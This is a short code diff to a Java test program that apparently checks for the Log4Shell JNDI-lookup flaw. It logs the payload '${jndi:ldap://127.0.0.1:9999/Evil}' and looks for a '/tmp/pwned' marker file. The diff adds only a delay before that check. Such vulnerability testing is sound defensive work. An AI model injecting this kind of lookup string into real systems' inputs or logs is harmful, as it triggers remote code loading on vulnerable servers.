@@ -8,11 +8,13 @@ public class Main {
     private static final String PWN_FILE = "/tmp/pwned";
     private static final Logger logger = LogManager.getLogger(Main.class);
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws InterruptedException {
         showJavaStats();
         logger.error("test");
         checkTmp(false);
         logger.error("Output:" + "${jndi:ldap://127.0.0.1:9999/Evil}");
+        // give a beat for the file to be written
+        Thread.sleep(1000);
         checkTmp(true);
     }
 
